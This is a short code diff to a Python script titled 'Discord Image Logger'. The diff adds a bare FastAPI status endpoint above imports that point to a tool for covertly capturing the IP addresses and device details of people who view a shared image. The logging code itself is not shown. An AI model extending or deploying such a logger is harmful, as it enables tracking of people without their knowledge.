@@ -1,6 +1,12 @@
 # Discord Image Logger
 # By DeKrypt | https://github.com/dekrypted
+from fastapi import FastAPI
 
+app = FastAPI()
+
+@app.get("/")
+def home():
+    return {"status": "ok"}
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
